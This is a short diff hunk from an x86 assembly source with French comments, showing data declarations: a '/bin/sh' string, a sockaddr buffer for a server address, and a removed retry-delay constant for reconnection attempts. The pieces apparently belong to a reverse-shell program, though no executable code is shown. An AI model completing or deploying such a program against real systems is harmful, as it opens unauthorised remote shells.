@@ -5,9 +5,6 @@ section .data
     
     ; Chemin vers le shell
     shell db "/bin/sh", 0
-    
-    ; Constantes pour nanosleep
-    RETRY_SECONDS equ 5       ; Nombre de secondes à attendre entre les tentatives
 
 section .bss
     sockaddr resb 16          ; Structure pour stocker l'adresse du serveur
